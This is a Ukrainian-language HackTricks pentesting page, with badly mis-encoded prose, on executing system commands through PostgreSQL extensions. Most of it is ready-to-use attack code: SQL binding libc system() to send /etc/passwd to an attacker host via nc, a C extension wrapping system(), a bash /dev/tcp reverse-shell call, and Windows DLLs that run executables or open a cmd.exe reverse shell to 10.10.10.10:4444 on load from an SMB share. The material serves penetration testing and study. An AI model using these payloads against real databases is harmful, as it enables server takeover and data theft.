# –í–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º —Ä–æ–∑—à–∏—Ä–µ–Ω—å PostgreSQL

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* –í–∏ –ø—Ä–∞—Ü—é—î—Ç–µ –≤ **–∫—ñ–±–µ—Ä–±–µ–∑–ø–µ—Ü—ñ–≤—ñ–π –∫–æ–º–ø–∞–Ω—ñ—ó**? –•–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ **—Ä–µ–∫–ª–∞–º—É –≤–∞—à–æ—ó –∫–æ–º–ø–∞–Ω—ñ—ó –Ω–∞ HackTricks**? –∞–±–æ —Ö–æ—á–µ—Ç–µ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **–æ—Å—Ç–∞–Ω–Ω—å–æ—ó –≤–µ—Ä—Å—ñ—ó PEASS –∞–±–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**? –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** [**üí¨**](https://emojipedia.org/speech-balloon/) [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –º–Ω–æ—é –Ω–∞ **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ [—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks](https://github.com/carlospolop/hacktricks) —Ç–∞ [—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## –†–æ–∑—à–∏—Ä–µ–Ω–Ω—è PostgreSQL

PostgreSQL –±—É–≤ —Ä–æ–∑—Ä–æ–±–ª–µ–Ω–∏–π –∑ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—é —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è —è–∫ –æ—Å–Ω–æ–≤–Ω–æ—é —Ñ—É–Ω–∫—Ü—ñ—î—é, —â–æ –¥–æ–∑–≤–æ–ª—è—î –±–µ–∑–ø–µ—Ä–µ—à–∫–æ–¥–Ω–æ —ñ–Ω—Ç–µ–≥—Ä—É–≤–∞—Ç–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è, –Ω—ñ–±–∏ –≤–æ–Ω–∏ –±—É–ª–∏ –≤–±—É–¥–æ–≤–∞–Ω–∏–º–∏ —Ñ—É–Ω–∫—Ü—ñ—è–º–∏. –¶—ñ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è, –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏, –Ω–∞–ø–∏—Å–∞–Ω—ñ –Ω–∞ C, –∑–±–∞–≥–∞—á—É—é—Ç—å –±–∞–∑—É –¥–∞–Ω–∏—Ö –¥–æ–¥–∞—Ç–∫–æ–≤–∏–º–∏ —Ñ—É–Ω–∫—Ü—ñ—è–º–∏, –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞–º–∏ –∞–±–æ —Ç–∏–ø–∞–º–∏.

–ü–æ—á–∏–Ω–∞—é—á–∏ –∑ –≤–µ—Ä—Å—ñ—ó 8.1, –Ω–∞ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è –Ω–∞–∫–ª–∞–¥–∞—î—Ç—å—Å—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∞ –≤–∏–º–æ–≥–∞: –≤–æ–Ω–∏ –ø–æ–≤–∏–Ω–Ω—ñ –±—É—Ç–∏ —Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω—ñ –∑—ñ —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–∏–º –∑–∞–≥–æ–ª–æ–≤–∫–æ–º. –ë–µ–∑ —Ü—å–æ–≥–æ PostgreSQL –Ω–µ –≤–∏–∫–æ–Ω–∞—î —ó—Ö, –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –ª–∏—à–µ —Å—É–º—ñ—Å–Ω–∏—Ö —Ç–∞ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –±–µ–∑–ø–µ—á–Ω–∏—Ö —Ä–æ–∑—à–∏—Ä–µ–Ω—å.

–¢–∞–∫–æ–∂ –ø–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ **—è–∫—â–æ –≤–∏ –Ω–µ –∑–Ω–∞—î—Ç–µ, —è–∫** [**–∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —Ñ–∞–π–ª–∏ –Ω–∞ –∂–µ—Ä—Ç–≤—É, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ PostgreSQL, –≤–∞–º —Å–ª—ñ–¥ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ —Ü–µ–π –ø–æ—Å—Ç.**](big-binary-files-upload-postgresql.md)

### –í–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É –≤ Linux

**–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ: [https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)**

–í–∏–∫–æ–Ω–∞–Ω–Ω—è —Å–∏—Å—Ç–µ–º–Ω–∏—Ö –∫–æ–º–∞–Ω–¥ –∑ PostgreSQL –≤–µ—Ä—Å—ñ—ó 8.1 —Ç–∞ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ—Ö —î –ø—Ä–æ—Ü–µ—Å–æ–º, —è–∫–∏–π –±—É–≤ —á—ñ—Ç–∫–æ –∑–∞–¥–æ–∫—É–º–µ–Ω—Ç–æ–≤–∞–Ω–∏–π —ñ –ø—Ä–æ—Å—Ç–∏–π. –¶–µ –º–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ: [–ú–æ–¥—É–ª—å Metasploit](https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres_payload).
```sql
CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');

# You can also create functions to open and write files
CREATE OR REPLACE FUNCTION open(cstring, int, int) RETURNS int AS '/lib/libc.so.6', 'open' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION write(int, cstring, int) RETURNS int AS '/lib/libc.so.6', 'write' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION close(int) RETURNS int AS '/lib/libc.so.6', 'close' LANGUAGE 'C' STRICT;
```
<details>

<summary>–ó–∞–ø–∏—Å–∞—Ç–∏ –¥–≤—ñ–π–∫–æ–≤–∏–π —Ñ–∞–π–ª –∑ base64</summary>

–î–ª—è –∑–∞–ø–∏—Å—É –¥–≤—ñ–π–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö —É —Ñ–∞–π–ª —É postgres –º–æ–∂–ª–∏–≤–æ –∑–Ω–∞–¥–æ–±–∏—Ç—å—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è base64, —Ü–µ –±—É–¥–µ –∫–æ—Ä–∏—Å–Ω–æ –≤ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É:
```sql
CREATE OR REPLACE FUNCTION write_to_file(file TEXT, s TEXT) RETURNS int AS
$$
DECLARE
fh int;
s int;
w bytea;
i int;
BEGIN
SELECT open(textout(file)::cstring, 522, 448) INTO fh;

IF fh <= 2 THEN
RETURN 1;
END IF;

SELECT decode(s, 'base64') INTO w;

i := 0;
LOOP
EXIT WHEN i >= octet_length(w);

SELECT write(fh,textout(chr(get_byte(w, i)))::cstring, 1) INTO rs;

IF rs < 0 THEN
RETURN 2;
END IF;

i := i + 1;
END LOOP;

SELECT close(fh) INTO rs;

RETURN 0;

END;
$$ LANGUAGE 'plpgsql';
```
</details>

–û–¥–Ω–∞–∫, –∫–æ–ª–∏ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –Ω–∞ –±—ñ–ª—å—à–∏—Ö –≤–µ—Ä—Å—ñ—è—Ö, **–±—É–¥–µ –ø–æ–∫–∞–∑–∞–Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω–∞ –ø–æ–º–∏–ª–∫–∞**:
```c
ERROR:  incompatible library ‚Äú/lib/x86_64-linux-gnu/libc.so.6‚Äù: missing magic block
HINT:  Extension libraries are required to use the PG_MODULE_MAGIC macro.
```
–¶—è –ø–æ–º–∏–ª–∫–∞ –ø–æ—è—Å–Ω—é—î—Ç—å—Å—è –≤ [–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó PostgreSQL](https://www.postgresql.org/docs/current/static/xfunc-c.html):

> –©–æ–± –∑–∞–±–µ–∑–ø–µ—á–∏—Ç–∏, —â–æ –¥–∏–Ω–∞–º—ñ—á–Ω–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–π –æ–±'—î–∫—Ç–Ω–∏–π —Ñ–∞–π–ª –Ω–µ –±—É–¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ –≤ –Ω–µ—Å—É–º—ñ—Å–Ω–∏–π —Å–µ—Ä–≤–µ—Ä, PostgreSQL –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ —Ñ–∞–π–ª –º—ñ—Å—Ç–∏—Ç—å "–º–∞–≥—ñ—á–Ω–∏–π –±–ª–æ–∫" –∑ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–º –≤–º—ñ—Å—Ç–æ–º. –¶–µ –¥–æ–∑–≤–æ–ª—è—î —Å–µ—Ä–≤–µ—Ä—É –≤–∏—è–≤–ª—è—Ç–∏ –æ—á–µ–≤–∏–¥–Ω—ñ –Ω–µ—Å—É–º—ñ—Å–Ω–æ—Å—Ç—ñ, —Ç–∞–∫—ñ —è–∫ –∫–æ–¥, —Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–∏–π –¥–ª—è —ñ–Ω—à–æ—ó –æ—Å–Ω–æ–≤–Ω–æ—ó –≤–µ—Ä—Å—ñ—ó PostgreSQL. –ú–∞–≥—ñ—á–Ω–∏–π –±–ª–æ–∫ –ø–æ—Ç—Ä—ñ–±–Ω–∏–π –ø–æ—á–∏–Ω–∞—é—á–∏ –∑ PostgreSQL 8.2. –©–æ–± –≤–∫–ª—é—á–∏—Ç–∏ –º–∞–≥—ñ—á–Ω–∏–π –±–ª–æ–∫, –Ω–∞–ø–∏—à—ñ—Ç—å —Ü–µ –≤ –æ–¥–Ω–æ–º—É (—ñ —Ç—ñ–ª—å–∫–∏ –æ–¥–Ω–æ–º—É) –∑ —Ñ–∞–π–ª—ñ–≤ –¥–∂–µ—Ä–µ–ª –º–æ–¥—É–ª—è –ø—ñ—Å–ª—è –≤–∫–ª—é—á–µ–Ω–Ω—è –∑–∞–≥–æ–ª–æ–≤–∫–∞ fmgr.h:
>
> `#ifdef PG_MODULE_MAGIC`\
> `PG_MODULE_MAGIC;`\
> `#endif`

–ü–æ—á–∏–Ω–∞—é—á–∏ –∑ –≤–µ—Ä—Å—ñ—ó PostgreSQL 8.2, –ø—Ä–æ—Ü–µ—Å –¥–ª—è –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞, —è–∫–∏–π –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Å–∏—Å—Ç–µ–º—É, —Å—Ç–∞–≤ –±—ñ–ª—å—à —Å–∫–ª–∞–¥–Ω–∏–º. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –ø–æ–≤–∏–Ω–µ–Ω –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É, —è–∫–∞ –≤–∂–µ –ø—Ä–∏—Å—É—Ç–Ω—è –≤ —Å–∏—Å—Ç–µ–º—ñ, –∞–±–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –≤–ª–∞—Å–Ω—É –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É. –¶—è –≤–ª–∞—Å–Ω–∞ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞ –ø–æ–≤–∏–Ω–Ω–∞ –±—É—Ç–∏ —Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–∞ –¥–ª—è —Å—É–º—ñ—Å–Ω–æ—ó –æ—Å–Ω–æ–≤–Ω–æ—ó –≤–µ—Ä—Å—ñ—ó PostgreSQL —Ç–∞ –ø–æ–≤–∏–Ω–Ω–∞ –º—ñ—Å—Ç–∏—Ç–∏ –ø–µ–≤–Ω–∏–π "–º–∞–≥—ñ—á–Ω–∏–π –±–ª–æ–∫". –¶—è –º—ñ—Ä–∞ –∑–Ω–∞—á–Ω–æ —É—Å–∫–ª–∞–¥–Ω—é—î –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Å–∏—Å—Ç–µ–º PostgreSQL, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏–º–∞–≥–∞—î –≥–ª–∏–±–æ–∫–æ–≥–æ —Ä–æ–∑—É–º—ñ–Ω–Ω—è –∞—Ä—Ö—ñ—Ç–µ–∫—Ç—É—Ä–∏ —Å–∏—Å—Ç–µ–º–∏ —Ç–∞ —Å—É–º—ñ—Å–Ω–æ—Å—Ç—ñ –≤–µ—Ä—Å—ñ–π.

#### –°–∫–æ–º–ø—ñ–ª—é–π—Ç–µ –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É

–û—Ç—Ä–∏–º–∞–π—Ç–µ –≤–µ—Ä—Å—ñ—é PostgreSQL –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```sql
SELECT version();
PostgreSQL 9.6.3 on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18) 6.3.0 20170516, 64-bit
```
–î–ª—è —Å—É–º—ñ—Å–Ω–æ—Å—Ç—ñ –≤–∞–∂–ª–∏–≤–æ, —â–æ–± –æ—Å–Ω–æ–≤–Ω—ñ –≤–µ—Ä—Å—ñ—ó –≤—ñ–¥–ø–æ–≤—ñ–¥–∞–ª–∏ –æ–¥–Ω–∞ –æ–¥–Ω—ñ–π. –¢–æ–º—É –∫–æ–º–ø—ñ–ª—è—Ü—ñ—è –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ –∑ –±—É–¥—å-—è–∫–æ—é –≤–µ—Ä—Å—ñ—î—é —Å–µ—Ä—ñ—ó 9.6.x –ø–æ–≤–∏–Ω–Ω–∞ –≥–∞—Ä–∞–Ω—Ç—É–≤–∞—Ç–∏ —É—Å–ø—ñ—à–Ω—É —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—é.


–î–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —Ü—ñ—î—ó –≤–µ—Ä—Å—ñ—ó –Ω–∞ –≤–∞—à—É —Å–∏—Å—Ç–µ–º—É:
```bash
apt install postgresql postgresql-server-dev-9.6
```
–Ü —Å–∫–æ–º–ø—ñ–ª—é–π—Ç–µ –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É:
```c
//gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c
#include <string.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

PG_FUNCTION_INFO_V1(pg_exec);
Datum pg_exec(PG_FUNCTION_ARGS) {
char* command = PG_GETARG_CSTRING(0);
PG_RETURN_INT32(system(command));
}
```
–ü–æ—Ç—ñ–º –∑–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ —Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω—É –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É —Ç–∞ –≤–∏–∫–æ–Ω–∞–π—Ç–µ –∫–æ–º–∞–Ω–¥–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE C STRICT;
SELECT sys('bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"');
#Notice the double single quotes are needed to scape the qoutes
```
–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Ü—é **–±—ñ–±–ª—ñ–æ—Ç–µ–∫—É –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ —Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω—É** –¥–ª—è –∫—ñ–ª—å–∫–æ—Ö —Ä—ñ–∑–Ω–∏—Ö –≤–µ—Ä—Å—ñ–π PostgreSQL, —ñ –Ω–∞–≤—ñ—Ç—å –º–æ–∂–µ—Ç–µ **–∞–≤—Ç–æ–º–∞—Ç–∏–∑—É–≤–∞—Ç–∏ —Ü–µ–π –ø—Ä–æ—Ü–µ—Å** (—è–∫—â–æ —É –≤–∞—Å —î –¥–æ—Å—Ç—É–ø –¥–æ PostgreSQL) –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:

{% embed url="https://github.com/Dionach/pgexec" %}

### RCE –≤ Windows

–ù–∞—Å—Ç—É–ø–Ω–∞ DLL –ø—Ä–∏–π–º–∞—î –Ω–∞ –≤—Ö—ñ–¥ **—ñ–º'—è –≤–∏–∫–æ–Ω—É–≤–∞–Ω–æ–≥–æ —Ñ–∞–π–ª—É** —Ç–∞ **–∫—ñ–ª—å–∫—ñ—Å—Ç—å —Ä–∞–∑—ñ–≤**, —è–∫—ñ –≤–∏ —Ö–æ—á–µ—Ç–µ –π–æ–≥–æ –≤–∏–∫–æ–Ω–∞—Ç–∏, —Ç–∞ –≤–∏–∫–æ–Ω—É—î –π–æ–≥–æ:
```c
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include "utils/builtins.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum pgsql_exec(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(pgsql_exec);

/* this function launches the executable passed in as the first parameter
in a FOR loop bound by the second parameter that is also passed*/
Datum
pgsql_exec(PG_FUNCTION_ARGS)
{
/* convert text pointer to C string */
#define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

/* retrieve the second argument that is passed to the function (an integer)
that will serve as our counter limit*/

int instances = PG_GETARG_INT32(1);

for (int c = 0; c < instances; c++) {
/*launch the process passed in the first parameter*/
ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
}
PG_RETURN_VOID();
}
```
–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ DLL, —Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–∏–π —É —Ü—å–æ–º—É zip-—Ñ–∞–π–ª—ñ:

{% file src="../../../.gitbook/assets/pgsql_exec.zip" %}

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∫–∞–∑–∞—Ç–∏ —Ü—ñ–π DLL **—è–∫–∏–π –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π —Ñ–∞–π–ª –≤–∏–∫–æ–Ω–∞—Ç–∏** —Ç–∞ –∫—ñ–ª—å–∫—ñ—Å—Ç—å —Ä–∞–∑—ñ–≤ –π–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è, —É —Ü—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ –≤—ñ–Ω –≤–∏–∫–æ–Ω–∞—î `calc.exe` 2 —Ä–∞–∑–∏:
```bash
CREATE OR REPLACE FUNCTION remote_exec(text, integer) RETURNS void AS '\\10.10.10.10\shared\pgsql_exec.dll', 'pgsql_exec' LANGUAGE C STRICT;
SELECT remote_exec('calc.exe', 2);
DROP FUNCTION remote_exec(text, integer);
```
–£ [**—Ü—å–æ–º—É** ](https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html) –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Ü–µ–π –∑–≤–æ—Ä–æ—Ç–Ω–∏–π shell:
```c
#define PG_REVSHELL_CALLHOME_SERVER "10.10.10.10"
#define PG_REVSHELL_CALLHOME_PORT "4444"

#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <winsock2.h>

#pragma comment(lib,"ws2_32")

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

#pragma warning(push)
#pragma warning(disable: 4996)
#define _WINSOCK_DEPRECATED_NO_WARNINGS

BOOL WINAPI DllMain(_In_ HINSTANCE hinstDLL,
_In_ DWORD fdwReason,
_In_ LPVOID lpvReserved)
{
WSADATA wsaData;
SOCKET wsock;
struct sockaddr_in server;
char ip_addr[16];
STARTUPINFOA startupinfo;
PROCESS_INFORMATION processinfo;

char *program = "cmd.exe";
const char *ip = PG_REVSHELL_CALLHOME_SERVER;
u_short port = atoi(PG_REVSHELL_CALLHOME_PORT);

WSAStartup(MAKEWORD(2, 2), &wsaData);
wsock = WSASocket(AF_INET, SOCK_STREAM,
IPPROTO_TCP, NULL, 0, 0);

struct hostent *host;
host = gethostbyname(ip);
strcpy_s(ip_addr, sizeof(ip_addr),
inet_ntoa(*((struct in_addr *)host->h_addr)));

server.sin_family = AF_INET;
server.sin_port = htons(port);
server.sin_addr.s_addr = inet_addr(ip_addr);

WSAConnect(wsock, (SOCKADDR*)&server, sizeof(server),
NULL, NULL, NULL, NULL);

memset(&startupinfo, 0, sizeof(startupinfo));
startupinfo.cb = sizeof(startupinfo);
startupinfo.dwFlags = STARTF_USESTDHANDLES;
startupinfo.hStdInput = startupinfo.hStdOutput =
startupinfo.hStdError = (HANDLE)wsock;

CreateProcessA(NULL, program, NULL, NULL, TRUE, 0,
NULL, NULL, &startupinfo, &processinfo);

return TRUE;
}

#pragma warning(pop) /* re-enable 4996 */

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum dummy_function(PG_FUNCTION_ARGS);

PG_FUNCTION_INFO_V1(add_one);

Datum dummy_function(PG_FUNCTION_ARGS)
{
int32 arg = PG_GETARG_INT32(0);

PG_RETURN_INT32(arg + 1);
}
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É **–∑–ª–æ–≤–º–∏—Å–Ω–∏–π –∫–æ–¥ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó DllMain**. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—É —Ñ—É–Ω–∫—Ü—ñ—é –≤ postgresql, –ø—Ä–æ—Å—Ç–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è DLL** –≤–∏–∫–ª–∏—á–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∑–≤–æ—Ä–æ—Ç–Ω–æ–≥–æ —à–µ–ª—É:
```c
CREATE OR REPLACE FUNCTION dummy_function(int) RETURNS int AS '\\10.10.10.10\shared\dummy_function.dll', 'dummy_function' LANGUAGE C STRICT;
```
### –í–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É –Ω–∞ –≤—ñ–¥–¥–∞–ª–µ–Ω—ñ–π –º–∞—à–∏–Ω—ñ –≤ –æ—Å—Ç–∞–Ω–Ω—ñ—Ö –≤–µ—Ä—Å—ñ—è—Ö Prostgres

–£ **–æ—Å—Ç–∞–Ω–Ω—ñ—Ö –≤–µ—Ä—Å—ñ—è—Ö** PostgreSQL –±—É–ª–∏ –≤–≤–µ–¥–µ–Ω—ñ –æ–±–º–µ–∂–µ–Ω–Ω—è, –∑–∞ —è–∫–∏–º–∏ `—Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á` **–∑–∞–±–æ—Ä–æ–Ω–µ–Ω–æ** –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —Ñ–∞–π–ª–∏ —Å–ø—ñ–ª—å–Ω–∏—Ö –±—ñ–±–ª—ñ–æ—Ç–µ–∫, –∫—Ä—ñ–º –∑–∞–∑–Ω–∞—á–µ–Ω–∏—Ö –∫–∞—Ç–∞–ª–æ–≥—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ `C:\Program Files\PostgreSQL\11\lib` —É Windows –∞–±–æ `/var/lib/postgresql/11/lib` –Ω–∞ —Å–∏—Å—Ç–µ–º–∞—Ö \*nix. –¶—ñ –∫–∞—Ç–∞–ª–æ–≥–∏ –∑–∞—Ö–∏—â–µ–Ω—ñ –≤—ñ–¥ –æ–ø–µ—Ä–∞—Ü—ñ–π –∑–∞–ø–∏—Å—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ NETWORK\_SERVICE –∞–±–æ postgres.

–ù–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ —Ü—ñ –æ–±–º–µ–∂–µ–Ω–Ω—è, –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π `—Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á` –±–∞–∑–∏ –¥–∞–Ω–∏—Ö –º–æ–∂–µ **–∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ –±—ñ–Ω–∞—Ä–Ω—ñ —Ñ–∞–π–ª–∏** –Ω–∞ —Ñ–∞–π–ª–æ–≤—É —Å–∏—Å—Ç–µ–º—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ "–≤–µ–ª–∏–∫—ñ –æ–±'—î–∫—Ç–∏". –¶—è –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å —Ä–æ–∑—à–∏—Ä—é—î—Ç—å—Å—è –Ω–∞ –∑–∞–ø–∏—Å —É –∫–∞—Ç–∞–ª–æ–∑—ñ `C:\Program Files\PostgreSQL\11\data`, —â–æ —î –≤–∞–∂–ª–∏–≤–∏–º –¥–ª—è –æ–ø–µ—Ä–∞—Ü—ñ–π –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —Ç–∞–∫–∏—Ö —è–∫ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –∞–±–æ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ç–∞–±–ª–∏—Ü—å.

